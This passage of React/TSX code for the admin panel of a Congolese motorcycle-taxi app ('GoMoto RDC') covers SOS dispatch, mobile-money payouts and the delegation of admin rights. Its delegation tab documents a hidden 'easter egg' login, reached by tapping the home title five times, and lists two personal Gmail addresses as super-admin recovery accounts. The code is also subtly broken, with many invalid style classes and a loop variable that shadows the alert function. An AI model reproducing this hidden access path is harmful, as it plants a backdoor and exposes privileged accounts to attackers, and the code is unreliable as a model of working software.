                              className="bg-indigo-650 hover:bg-indigo-700 text-white font-bold py-1 rounded text-[8px] cursor-pointer text-center block"
                            >
                              🚀 Centrale GoMoto
                            </button>
                            <button
                              type="button"
                              onClick={() => handleDispatchBrigade(focusedAlert.id, "pnc")}
                              className="bg-rose-700 hover:bg-rose-800 text-white font-bold py-1 rounded text-[8px] cursor-pointer text-center block"
                            >
                              👮 Police PNC
                            </button>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })() : (
                  <div className="flex-1 flex flex-col items-center justify-center text-center p-3 text-slate-500 font-sans">
                    <Map className="w-8 h-8 text-slate-700 animate-pulse mb-2" />
                    <p className="text-[10px] uppercase font-mono font-bold tracking-wider text-slate-400">Télémétrie en attente</p>
                    <p className="text-[9px] text-slate-600 max-w-[180px] mt-1 pl-1 pr-1 leading-normal">Sélectionnez une balise SOS rouge sur la carte pour émettre des forces de sécurité.</p>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* SOS List Container */}
          {sosAlerts.length === 0 ? (
            <div className="bg-slate-50 border border-slate-200 p-10 rounded-2xl text-center space-y-2">
              <div className="h-11 w-11 bg-white border border-slate-200 rounded-full flex items-center justify-center mx-auto text-sm text-slate-400">
                ☘️
              </div>
              <h4 className="text-xs font-black text-slate-800">Aucune alerte de détresse signalée</h4>
              <p className="text-[10.5px] text-slate-500 max-w-md mx-auto leading-relaxed">
                Le réseau d'escorte GoMoto RDC est actuellement sous sécurité totale. Aucune défaillance ou demande de panique n'est transmise d'urgence.
              </p>
            </div>
          ) : (
            <div className="space-y-4">
              {sosAlerts.map((alert) => {
                const noteInputId = `sos-note-${alert.id}`;
                return (
                  <div 
                    key={alert.id} 
                    className={`bg-white border rounded-3xl p-5 shadow-sm space-y-4 transition-all text-left ${
                      alert.status === "active" ? "border-red-500 ring-2 ring-red-100" : "border-slate-200"
                    }`}
                  >
                    {/* Panel Header Banner */}
                    <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-3 pb-3 border-b border-slate-100">
                      <div className="flex items-center gap-3 text-left">
                        <div className={`h-10 w-10 rounded-xl flex items-center justify-center text-xs font-black ${
                          alert.status === "active" ? "bg-red-500 text-white animate-pulse" : "bg-slate-150 text-slate-500"
                        }`}>
                          🚨
                        </div>
                        <div>
                          <h4 className="font-extrabold text-slate-800 text-xs flex items-center gap-2">
                            <span>{alert.userName}</span>
                            <span className={`px-2 py-0.5 rounded text-[8px] uppercase tracking-wider font-extrabold ${
                              alert.userRole === "driver" ? "bg-amber-100 text-amber-805" : "bg-purple-100 text-purple-805"
                            }`}>
                              {alert.userRole === "driver" ? "Chauffeur / Motard" : "Passager / Client"}
                            </span>
                          </h4>
                          <p className="text-[10.5px] text-slate-500 mt-0.5">
                            Émis le {alert.timestamp} • Contact : <span className="font-bold text-slate-705">{alert.userPhone}</span>
                          </p>
                        </div>
                      </div>

                      <div className="flex items-center gap-2">
                        <button
                          type="button"
                          onClick={() => setFocusedSOSId(alert.id)}
                          className="bg-indigo-50 hover:bg-indigo-100 text-indigo-700 py-1 px-2.5 rounded-lg text-[9px] font-bold uppercase transition-all shadow-xs cursor-pointer mr-1"
                        >
                          👁️ Focaliser Carte
                        </button>

                        {alert.status === "active" ? (
                          <span className="bg-red-50 text-red-700 border border-red-200 px-2.5 py-0.5 rounded-full text-[8.5px] font-black uppercase tracking-wide inline-flex items-center gap-1.5 animate-pulse">
                            <span className="h-2.5 w-2.5 rounded-full bg-red-650 animate-ping"></span>
                            Alerte Active
                          </span>
                        ) : (
                          <span className="bg-emerald-50 text-emerald-800 border border-emerald-100 px-2.5 py-0.5 rounded-full text-[8.5px] font-black uppercase tracking-wide inline-flex items-center gap-1">
                            ✓ Résolu & Clôturé
                          </span>
                        )}
                      </div>
                    </div>

                    {/* Content telemetry */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-sans">
                      <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-100 space-y-2 text-left animate-in fade-in">
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest block font-mono">Détails du Signal</span>
                        <p className="text-slate-800 leading-normal font-medium text-xs">
                          <b>Motif déclaré :</b> <span className="text-red-750 font-bold">{alert.reason}</span>
                        </p>
                        <p className="text-slate-500">
                          <b>ID Dispatch :</b> <span className="font-mono text-[9.5px] text-slate-700 bg-slate-205 px-1 py-0.2 rounded font-bold">{alert.id}</span>
                        </p>
                      </div>

                      <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-100 space-y-1.5 text-left font-mono text-[10.5px]">
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest block font-sans">Vecteur d'Audit Satellitaire</span>
                        <div className="flex justify-between">
                          <span className="text-slate-550">Latitude :</span>
                          <span className="text-indigo-900 font-bold">{alert.latitude.toFixed(6)}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-550">Longitude :</span>
                          <span className="text-indigo-900 font-bold">{alert.longitude.toFixed(6)}</span>
                        </div>
                        <div className="border-t border-slate-200/50 pt-1 mt-1 flex justify-between text-[8px] text-slate-400 font-sans">
                          <span>Triangulation GPS :</span>
                          <span className="text-yellow-600 font-extrabold uppercase">Validé par GoMoto-Sat</span>
                        </div>
                      </div>
                    </div>

                    {/* Resolution actions */}
                    {alert.status === "active" ? (
                      <div className="bg-slate-50 p-3 rounded-2xl border border-slate-200 flex flex-col md:flex-row items-stretch justify-between gap-4 text-left">
                        <div className="flex-1">
                          <input
                            type="text"
                            id={noteInputId}
                            placeholder="Saisissez vos annotations d'enquête ou constat policiers (ex: Patrouille PNC déployée, situation sous contrôle, fausse alerte...)"
                            className="w-full bg-white border border-slate-202 rounded-xl px-3 py-2 text-xs text-slate-850 outline-none focus:border-red-500 font-sans"
                          />
                        </div>

                        <div className="flex items-center shrink-0">
                          <button
                            type="button"
                            onClick={() => {
                              const el = document.getElementById(noteInputId) as HTMLInputElement;
                              const val = el ? el.value.trim() : "";
                              const notes = val || "Alerte de détresse prise en charge par la centrale d'intervention.";
                              if (onResolveSOSAlert) {
                                onResolveSOSAlert(alert.id, notes);
                              } else {
                                alert("Fonction de clôture indisponible actuellement.");
                              }
                            }}
                            className="bg-emerald-650 hover:bg-emerald-700 text-white font-extrabold py-2 px-4 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm font-sans"
                          >
                            <Check className="w-4 h-4" />
                            <span>Résoudre & Clôturer</span>
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="p-3 bg-emerald-50 rounded-xl border border-emerald-100/60 text-[10.5px] text-slate-700 text-left font-sans italic">
                        <b>Rapport d'Intervention administrative :</b> {alert.resolutionNotes || "Alerte classée sans dérive."}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* ================= ADMIN TAB 5: MOBILE MONEY WITHDRAWALS PAYOUT DISPATCH ================= */}
      {activeSubTab === "transactions" && (
        <div className="space-y-6 text-left">
          
          <div className="bg-slate-50 p-5 rounded-3xl border border-slate-200 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div className="space-y-1 text-left">
              <span className="bg-blue-100 text-blue-700 font-bold text-[8.5px] px-2.5 py-0.5 rounded-full tracking-wider uppercase font-sans">
                Paiements & Mobile Money Brokerage
              </span>
              <h3 className="text-sm font-black text-slate-800 flex items-center gap-1.5 mt-1 font-sans">
                <Wallet className="w-5 h-5 text-blue-600" />
                <span>Dispatching National des Décaissements Partenaires</span>
              </h3>
              <p className="text-[11px] text-slate-500 leading-normal max-w-xl font-sans">
                Gérez et validez les transferts sortants demandés par les motards et les propriétaires fleetiens de GoMoto. L'API automatise l'acheminement direct vers les réseaux de téléphonie mobile de RDC.
              </p>
            </div>

            <div className="bg-white border border-slate-200 shadow-sm p-4 rounded-2xl shrink-0 text-center md:text-right font-sans">
              <span className="text-[9px] text-slate-400 block uppercase block font-bold font-mono">Commission globale collectée</span>
              <span className="text-xl font-mono font-black text-emerald-600">8.42% / Taxe RDC</span>
            </div>
          </div>

          <div className="space-y-4">
            <h4 className="text-xs font-bold text-slate-500 uppercase tracking-widest flex items-center gap-1.5 font-sans">
              <Smartphone className="w-4 h-4 text-blue-605" />
              <span>Demandes de virements M-Pesa / Wave / Airtel / Orange</span>
            </h4>

            {withdrawals.length === 0 ? (
              <div className="bg-slate-50 border border-slate-200 p-8 rounded-3xl text-center">
                <p className="text-xs text-slate-500 font-sans">Aucune demande de retrait mobile money en attente d'arbitrage.</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-4">
                {withdrawals.map((w) => {
                  const notesInputId = `withdr-note-${w.id}`;
                  return (
                    <div 
                      key={w.id} 
                      className={`bg-white border rounded-3xl p-5 shadow-xs flex flex-col lg:flex-row justify-between gap-5 items-stretch transition-all ${
                        w.status === "pending" ? "border-blue-200 ring-1 ring-blue-50/50" : "border-slate-200 bg-slate-50/20"
                      }`}
                    >
                      <div className="flex-1 space-y-4">
                        {/* Header details */}
                        <div className="flex items-center gap-3">
                          <div className={`h-9 w-9 rounded-xl flex items-center justify-center text-sm font-black ${
                            w.operator === "M-Pesa" ? "bg-red-50 text-red-600 border border-red-105" :
                            w.operator === "Orange Money" ? "bg-orange-50 text-orange-600 border border-orange-105" :
                            w.operator === "Airtel Money" ? "bg-rose-50 text-rose-600 border border-rose-105" :
                            "bg-blue-50 text-blue-600 border border-blue-105"
                          }`}>
                            📱
                          </div>

                          <div className="text-left font-sans">
                            <h5 className="font-extrabold text-slate-800 text-xs flex items-center gap-2">
                              <span>{w.userName}</span>
                              <span className={`px-2 py-0.2 rounded text-[8px] uppercase tracking-wider font-extrabold ${
                                w.userRole === "driver" ? "bg-amber-100 text-amber-800 border border-amber-200" : "bg-blue-100 text-blue-800 border border-blue-200"
                              }`}>
                                {w.userRole === "driver" ? "Motard / Chauffeur" : "Propriétaire Flotte"}
                              </span>
                            </h5>
                            <p className="text-[10px] text-slate-500 font-sans mt-0.5">
                              ID Partenaire : <span className="font-mono">{w.userId}</span> • Tél : {w.userPhone}
                            </p>
                          </div>
                        </div>

                        {/* Values grid */}
                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs font-sans text-left">
                          <div className="bg-slate-50/65 p-2.5 rounded-xl border border-slate-100">
                            <span className="text-[8px] font-bold text-slate-400 uppercase font-mono block">Virement Demandé</span>
                            <span className={`font-mono font-extrabold text-[12px] block mt-0.5 ${w.currency === "USD" ? "text-blue-600" : "text-emerald-600"}`}>
                              {w.currency === "USD" ? "$" : ""}{w.amount.toLocaleString()} {w.currency}
                            </span>
                          </div>
                          
                          <div className="bg-slate-50/65 p-2.5 rounded-xl border border-slate-100">
                            <span className="text-[8px] font-bold text-slate-400 uppercase font-mono block">Opérateur mobile RDC</span>
                            <span className="font-extrabold text-slate-800 block mt-0.5 flex items-center gap-1">
                              <span className="h-2 w-2 rounded-full bg-blue-500"></span>
                              {w.operator}
                            </span>
                          </div>

                          <div className="bg-slate-50/65 p-2.5 rounded-xl border border-slate-100">
                            <span className="text-[8px] font-bold text-slate-400 uppercase font-mono block">Téléphone de dépôt</span>
                            <span className="font-mono font-bold text-slate-700 block mt-0.5 text-xs">
                              {w.operatorPhone}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Right feedback panel */}
                      <div className="flex flex-col justify-between items-end self-stretch lg:border-l lg:border-slate-150 lg:pl-5 shrink-0 lg:w-[260px] gap-3">
                        <div className="flex flex-col items-end w-full text-right font-sans">
                          <span className="text-[9px] text-slate-400 font-mono tracking-widest uppercase mb-1">Dossier de Retrait</span>
                          {w.status === "pending" ? (
                            <span className="bg-yellow-50 text-yellow-700 border border-yellow-200 px-2 py-0.5 rounded text-[8px] font-black uppercase tracking-wider animate-pulse inline-block">
                              ⌛ Retrait en suspens
                            </span>
                          ) : w.status === "approved" ? (
                            <span className="bg-emerald-50 text-emerald-750 border border-emerald-200 px-2.5 py-0.5 rounded text-[8.5px] font-black uppercase tracking-wider inline-block">
                              ✓ Accord de Virement
                            </span>
                          ) : (
                            <span className="bg-red-50 text-red-750 border border-red-200 px-2.5 py-0.5 rounded text-[8.5px] font-black uppercase tracking-wider inline-block">
                              ✕ Bloqué pour suspicion
                            </span>
                          )}
                          <span className="text-[8px] text-slate-400 font-mono block mt-1">Transmis le {w.requestedAt}</span>
                        </div>

                        {w.status === "pending" ? (
                          <div className="w-full space-y-2 text-left">
                            <input
                              type="text"
                              id={notesInputId}
                              placeholder="Notes et références de transaction..."
                              className="w-full bg-slate-50 border border-slate-205 hover:border-slate-300 rounded-lg px-2.5 py-1.5 text-[10px] text-slate-850 outline-none focus:bg-white focus:border-blue-600 font-sans"
                            />
                            
                            <div className="flex gap-2">
                              <button
                                type="button"
                                onClick={() => {
                                  const el = document.getElementById(notesInputId) as HTMLInputElement;
                                  const val = el ? el.value.trim() : "";
                                  handleReviewWithdrawal(w.id, "rejected", val || "Retrait rejeté pour non-conformité.");
                                }}
                                className="flex-1 bg-red-50 hover:bg-red-100 border border-red-200 text-red-650 font-black py-1.5 px-2 rounded-lg text-[9.5px] cursor-pointer text-center"
                              >
                                Annuler
                              </button>
                              
                              <button
                                type="button"
                                onClick={() => {
                                  const el = document.getElementById(notesInputId) as HTMLInputElement;
                                  const val = el ? el.value.trim() : "";
                                  handleReviewWithdrawal(w.id, "approved", val || "Débit validé. Virement API d'opérateur mobile complété.");
                                }}
                                className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white font-black py-1.5 px-2.5 rounded-lg text-[9.5px] cursor-pointer text-center"
                              >
                                Décaisser
                              </button>
                            </div>
                          </div>
                        ) : (
                          <div className="bg-slate-50 border border-slate-100 p-2 rounded-xl text-[9px] text-slate-500 font-sans italic w-full text-left leading-normal">
                            <b>Verdict admin :</b> {w.adminNotes || "Transaction admissible acquittée."}
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ================= ADMIN TAB 6: PARTNERSHIP PORTFOLIO & TELECOM/MOMO AGREEMENTS ================= */}
      {activeSubTab === "partenariats" && (
        <PartnershipProposals onClose={() => setActiveSubTab("requests")} />
      )}

      {/* ================= ADMIN TAB 7: COLLABORATOR CO-DELEGATION & PRIVILEGES MANAGEMENT ================= */}
      {activeSubTab === "delegation" && (
        <div className="space-y-6 animate-in fade-in duration-200">
          
          {/* Header Note */}
          <div className="bg-indigo-50 border border-indigo-150 p-5 rounded-2xl text-xs text-indigo-900 flex items-start gap-3">
            <span className="text-xl">🔐</span>
            <div>
              <span className="font-extrabold text-[12.5px] text-indigo-950 block">Modèle 2 : Délégation Administrative d'État et de Flotte</span>
              <p className="mt-1 leading-relaxed text-slate-655 text-[11px]">
                En conformité avec les réglementations de transport en République Démocratique du Congo, le titulaire d’immatriculation GoMoto RDC a la faculté d’octroyer ou de révoquer des délégations administratives. Les co-délégués reçoivent un accès chiffré pour traiter les plaintes, valider l’arbitrage, certifier les dossiers fiscaux, et répartir les missions d'assistance d'urgence.
              </p>
            </div>
          </div>

          {/* TECHNICAL INTEGRATION & GOOGLE OAUTH TESTER/DEMO BYPASS MANUAL (ADMIN READ-ONLY) */}
          <div className="bg-slate-900 border border-slate-800 text-white p-5 rounded-2xl space-y-4 text-left shadow-xl">
            <div className="flex items-center gap-2.5 pb-2 border-b border-slate-800">
              <span className="p-1.5 bg-yellow-500/10 text-yellow-500 rounded-lg">
                <Key className="w-4 h-4 text-yellow-450" />
              </span>
              <div>
                <h4 className="text-xs font-black uppercase tracking-wider text-yellow-400">
                  Résolution Technique Google OAuth & Comptes Certifiés (Confidentiel Admin)
                </h4>
                <p className="text-[10px] text-slate-400">
                  Informations de secours et méthode d'accès cryptographique réservées aux administrateurs du système GoMoto.
                </p>
              </div>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs leading-relaxed text-slate-300">
              <div className="space-y-2 bg-slate-950/50 p-3.5 rounded-xl border border-slate-800/60">
                <span className="font-bold text-yellow-500 flex items-center gap-1">
                  🔧 Procédure d'accès rapide (Easter Egg de Secours) :
                </span>
                <p className="text-[11px] text-slate-400">
                  Pour préserver la clarté et la confidentialité de l'accueil de la plateforme :
                </p>
                <div className="bg-slate-900 px-3 py-2 rounded-lg border border-slate-850 text-[10.5px] text-slate-300 font-mono leading-normal">
                  Tapez <span className="text-yellow-400 font-extrabold">5 fois successivement</span> sur le titre principal <span className="text-white font-black hover:underline">"🏍️ GoMoto DRC"</span> de la page d'accueil d'un nouveau navigateur pour faire apparaître instantanément le module de connexion par e-mail homologué.
                </div>
              </div>

              <div className="space-y-2 bg-slate-950/50 p-3.5 rounded-xl border border-slate-800/60">
                <span className="font-bold text-emerald-400 flex items-center gap-1">
                  🔑 Comptes d'accès de secours homologués :
                </span>
                <p className="text-[11px] text-slate-400 leading-relaxed">
                  Utilisez l'une des adresses de modérateurs ci-dessous dans l'easter egg pour récupérer vos privilèges :
                </p>
                <div className="space-y-2 pt-1 font-mono">
                  <div className="flex items-center justify-between bg-slate-900 border border-slate-800 px-2.5 py-1.5 rounded-lg text-[11px]">
                    <span className="text-slate-300 font-medium">lumulazard5@gmail.com</span>
                    <span className="bg-purple-950/80 text-purple-300 border border-purple-800/50 text-[9px] font-extrabold px-1.5 py-0.5 rounded">SUPER ADMIN</span>
                  </div>
                  <div className="flex items-center justify-between bg-slate-900 border border-slate-800 px-2.5 py-1.5 rounded-lg text-[11px]">
                    <span className="text-slate-300 font-medium font-mono">aepisciculture@gmail.com</span>
                    <span className="bg-purple-950/80 text-purple-300 border border-purple-800/50 text-[9px] font-extrabold px-1.5 py-0.5 rounded">SUPER ADMIN</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* STRICT REGULATORY & FINANCIAL CAUTION BANNER */}
          <div className="bg-gradient-to-r from-red-900 to-amber-950 text-white p-5 rounded-2xl border border-red-700/50 space-y-2 text-left shadow-lg">
            <div className="flex items-center gap-2">
              <span className="text-red-400 font-extrabold text-sm animate-pulse">🛑</span>
              <span className="font-black text-xs uppercase tracking-wider text-red-100">
                DIRECTIVES COMPTABLES & PROTOCOLE ANTI-FRAUDE STRICT (GOMOTO RDC)
              </span>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-1.5 text-[10.5px] leading-relaxed text-slate-200">
              <div className="bg-black/25 p-3 rounded-xl border border-red-800/20 space-y-1">
                <span className="font-bold text-red-300 block">💸 ZÉRO ARGENT LIQUIDE</span>
                <p>Nos agents et co-délégués provinciaux ne perçoivent <b>strictement rien comme argent liquide</b>. Les flux transitent d'office via Rawbank ou Mobile Money intégrés.</p>
              </div>
              <div className="bg-black/25 p-3 rounded-xl border border-red-800/20 space-y-1">
                <span className="font-bold text-red-300 block">✍️ SOUMISSION ET DOUBLE-SIGNATURE</span>
                <p>Toute soumission ou transaction saisie en province reste suspendue à la <b>validation, l'approbation et la signature numérique formelle du Directeur Général ou des Propriétaires</b>.</p>
              </div>
              <div className="bg-black/25 p-3 rounded-xl border border-red-800/20 space-y-1">
                <span className="font-bold text-red-300 block">📞 CONTACT UNIQUE NATIONAL</span>
                <p><b>Un seul numéro de téléphone</b> officiel est affecté pour superviser l'ensemble des provinces de la RDC : <b className="text-white font-mono tracking-wider text-xs block mt-1">+243 89 900 0000</b></p>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
            
            {/* COLUMN 1: FORM TO ASSIGN DELEGATION */}
            <div className="lg:col-span-5 bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-4">
              <div className="flex items-center gap-2 border-b border-slate-200 pb-3">
                <span className="p-1.5 bg-indigo-50 text-indigo-700 rounded-lg">
                  <User className="w-4 h-4" />
                </span>
                <h3 className="text-xs font-black text-slate-900 uppercase tracking-widest">
                  Déclarer un Nouveau Délégué
                </h3>
              </div>

              <form onSubmit={handleAddDelegate} className="space-y-3.5">
                <div className="space-y-1 text-left">
                  <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                    Adresse E-mail Institutionnelle / Personnelle
                  </label>
                  <input
                    type="email"
                    required
                    value={newDelegateEmail}
                    onChange={(e) => setNewDelegateEmail(e.target.value)}
                    className="w-full bg-white border border-slate-250 rounded-xl px-3 py-2 text-xs text-slate-800 font-mono outline-none focus:border-indigo-600"
                    placeholder="exemple@collaborateur.cd"
                  />
                  <p className="text-[7.5px] text-slate-400 font-sans leading-none">
                    L'adresse à laquelle le code d'activation administrative est expédié.
                  </p>
                </div>

                <div className="space-y-1 text-left">
                  <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                    Nom complet du Collaborateur
                  </label>
                  <input
                    type="text"
                    required
                    value={newDelegateName}
                    onChange={(e) => setNewDelegateName(e.target.value)}
                    className="w-full bg-white border border-slate-250 rounded-xl px-3 py-2 text-xs text-slate-800 font-bold outline-none focus:border-indigo-600"
                    placeholder="Maitre Jean-Marie"
                  />
                </div>

                <div className="space-y-1 text-left">
                  <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                    Rôle Ministériel ou Opérationnel
                  </label>
                  <select
                    value={newDelegateRole}
                    onChange={(e) => setNewDelegateRole(e.target.value)}
                    className="w-full bg-white border border-slate-250 rounded-xl px-3 py-2 text-xs text-slate-805 font-bold outline-none focus:border-indigo-600 cursor-pointer"
                  >
                    <option value="Administrateur Délégué Spécial">Administrateur Délégué Spécial</option>
                    <option value="Modérateur Adjoint GoMoto RDC">Modérateur Adjoint GoMoto RDC</option>
                    <option value="Conseiller Juridique & Arbitre">Conseiller Juridique & Arbitre</option>
                    <option value="Inspecteur Fiscal (DGI RDC)">Inspecteur Fiscal (DGI RDC)</option>
                    <option value="Chef de Dépêche et Sécurisation SOS">Chef de Dépêche et Sécurisation SOS</option>
                  </select>
                </div>

                <div className="grid grid-cols-2 gap-3 text-left">
                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                      Province d'Attribution
                    </label>
                    <select
                      value={newDelegateProvince}
                      onChange={(e) => setNewDelegateProvince(e.target.value)}
                      className="w-full bg-white border border-slate-250 rounded-xl px-3 py-2 text-xs text-slate-805 font-bold outline-none focus:border-indigo-600 cursor-pointer"
                    >
                      <option value="Kinshasa">Kinshasa</option>
                      <option value="Kongo Central">Kongo Central</option>
                      <option value="Haut-Katanga">Haut-Katanga</option>
                      <option value="Lualaba">Lualaba</option>
                      <option value="Kasaï Central">Kasaï Central</option>
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                      Numéro Agent unique
                    </label>
                    <input
                      type="text"
                      required
                      value={newDelegateAgentNumber}
                      onChange={(e) => setNewDelegateAgentNumber(e.target.value)}
                      className="w-full bg-white border border-slate-250 rounded-xl px-3 py-2 text-xs text-slate-800 font-mono font-bold outline-none focus:border-indigo-600"
                      placeholder="GOMOTO-AG-2026-X"
                    />
                  </div>
                </div>

                {/* Privileges Configuration */}
                <div className="space-y-2 pt-2 border-t border-slate-200 text-left">
                  <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider mb-2">
                    Habilitation et Clefs d'Accès Système
                  </label>
                  
                  <div className="space-y-1.5 font-sans">
                    <button
                      type="button"
                      onClick={() => togglePrivilege("arbitration_rights")}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg border border-slate-150 bg-white hover:bg-slate-100 transition-all text-xs cursor-pointer"
                    >
                      <input
                        type="checkbox"
                        checked={selectedPrivileges.includes("arbitration_rights")}
                        readOnly
                        className="mt-0.5 rounded border-slate-350 text-indigo-600 cursor-pointer"
                      />
                      <div>
                        <span className="font-bold text-slate-800 block text-[10px] leading-tight">Arbitrage Civil & Recours</span>
                        <span className="text-[8.5px] text-slate-450 block leading-normal mt-0.5">Modifier statut légal d'identité des motards</span>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => togglePrivilege("fiscal_approvals")}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg border border-slate-150 bg-white hover:bg-slate-100 transition-all text-xs cursor-pointer"
                    >
                      <input
                        type="checkbox"
                        checked={selectedPrivileges.includes("fiscal_approvals")}
                        readOnly
                        className="mt-0.5 rounded border-slate-350 text-indigo-600 cursor-pointer"
                      />
                      <div>
                        <span className="font-bold text-slate-800 block text-[10px] leading-tight">Contrôle de Documents & Fiscalité</span>
                        <span className="text-[8.5px] text-slate-450 block leading-normal mt-0.5">Valider impôts professionnels et permis d'État</span>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => togglePrivilege("sos_dispatching")}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg border border-slate-150 bg-white hover:bg-slate-100 transition-all text-xs cursor-pointer"
                    >
                      <input
                        type="checkbox"
                        checked={selectedPrivileges.includes("sos_dispatching")}
                        readOnly
                        className="mt-0.5 rounded border-slate-350 text-indigo-600 cursor-pointer"
                      />
                      <div>
                        <span className="font-bold text-slate-800 block text-[10px] leading-tight">Centrale SOS & Intervention PNC</span>
                        <span className="text-[8.5px] text-slate-450 block leading-normal mt-0.5">Dépêcher brigades en direct sur incident</span>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => togglePrivilege("full_access")}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg border border-slate-150 bg-white hover:bg-slate-100 transition-all text-xs cursor-pointer"
                    >
                      <input
                        type="checkbox"
                        checked={selectedPrivileges.includes("full_access")}
                        readOnly
                        className="mt-0.5 rounded border-slate-350 text-indigo-600 cursor-pointer"
                      />
                      <div>
                        <span className="font-bold text-slate-800 block text-[10px] leading-tight">Omniprésence Admin Totale</span>
                        <span className="text-[8.5px] text-slate-450 block leading-normal mt-0.5">Révocation administrative absolue</span>
                      </div>
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full py-2.5 rounded-xl bg-indigo-650 hover:bg-indigo-700 text-white font-black text-xs uppercase tracking-widest transition-all cursor-pointer shadow-indigo-100 shadow-sm"
                >
                  Octroyer la Délégation
                </button>
              </form>
            </div>

            {/* COLUMN 2: ACTIVE DELEGATES REGISTRY */}
            <div className="lg:col-span-7 bg-white border border-slate-200 rounded-2xl p-5 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-200 pb-3 flex-wrap gap-2">
                <div className="flex items-center gap-2">
                  <span className="p-1.5 bg-emerald-50 text-emerald-600 rounded-lg">
                    <ShieldCheck className="w-4 h-4" />
                  </span>
                  <div>
                    <h3 className="text-xs font-black text-slate-900 uppercase tracking-widest leading-none">
                      Registre Administratif RDC
                    </h3>
                    <p className="text-[10px] text-slate-400 mt-1">Délégués accrédités et validés</p>
                  </div>
                </div>
                
                <span className="bg-indigo-100 text-indigo-805 text-[9px] font-mono px-2 py-0.5 rounded font-bold uppercase">
                  {delegatedAdmins.length} Comptes
                </span>
              </div>

              {/* List block */}
              <div className="space-y-3.5 pr-1">
                {delegatedAdmins.map((admin, idx) => {
                  return (
                    <div 
                      key={idx}
                      className={`p-4 rounded-2xl border transition-all text-left space-y-3 ${
                        admin.status === "active" 
                          ? "bg-slate-50/50 border-slate-200" 
                          : "bg-red-50/35 border-red-150 opacity-80"
                      }`}
                    >
                      
                      {/* Top Header */}
                      <div className="flex justify-between items-start flex-wrap gap-2">
                        <div className="space-y-1">
                          <h4 className="text-xs font-extrabold text-slate-900 flex items-center gap-1.5">
                            <span>{admin.fullName}</span>
                            {admin.email === "lumulazard5@gmail.com" && (
                              <span className="bg-yellow-105 text-yellow-805 text-[8px] font-bold uppercase px-1.5 py-0.2 rounded border border-yellow-200">
                                Délégué Principal
                              </span>
                            )}
                          </h4>
                          <span className="text-[10.5px] text-indigo-600 font-mono font-medium block">
                            {admin.email}
                          </span>
                        </div>

                        <div className="flex items-center gap-1.5 text-right flex-col">
                          {admin.status === "active" ? (
                            <span className="bg-emerald-100 text-emerald-805 border border-emerald-200 text-[8.5px] font-black uppercase px-2 py-0.5 rounded font-sans tracking-wide">
                              ✓ Délégation Active
                            </span>
                          ) : (
                            <span className="bg-red-100 text-red-808 border border-red-200 text-[8.5px] font-black uppercase px-2 py-0.5 rounded font-sans tracking-wide">
                              ✕ Droits Révoqués
                            </span>
                          )}
                          <span className="text-[8px] text-slate-400 block font-mono">
                            Créé le {admin.addedAt}
                          </span>
                        </div>
                      </div>

                      {/* Detail row */}
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pb-1.5">
                        <div className="bg-white p-2 rounded-xl border border-slate-150">
                          <span className="text-[7.5px] text-slate-400 uppercase font-mono block">Rôle assigné</span>
                          <span className="text-[9.5px] font-extrabold text-slate-800 mt-0.5 block truncate" title={admin.role}>
                            {admin.role}
                          </span>
                        </div>
                        
                        <div className="bg-white p-2 rounded-xl border border-slate-150">
                          <span className="text-[7.5px] text-slate-400 uppercase font-mono block font-sans">Province d'Attribution</span>
                          <span className="text-[9.5px] font-extrabold text-slate-800 mt-0.5 block">
                            {admin.province || "Kinshasa"}
                          </span>
                        </div>

                        <div className="bg-white p-2 rounded-xl border border-slate-150">
                          <span className="text-[7.5px] text-slate-400 uppercase font-mono block">N° Agent d'État</span>
                          <span className="text-[9.5px] font-mono font-extrabold text-indigo-700 mt-0.5 block">
                            {admin.agentNumber || `GOMOTO-AG-2026-${100 + idx}`}
                          </span>
                        </div>

                        <div className="bg-white p-2 rounded-xl border border-slate-150">
                          <span className="text-[7.5px] text-slate-400 uppercase font-mono block">Tutelle</span>
                          <span className="text-[9.5px] font-extrabold text-slate-850 mt-0.5 block truncate" title={admin.email.endsWith(".gov.cd") ? "Ministère du Transport RDC" : "Direction GoMoto RDC SAS"}>
                            {admin.email.endsWith(".gov.cd") ? "Ministère RDC" : "GoMoto SAS"}
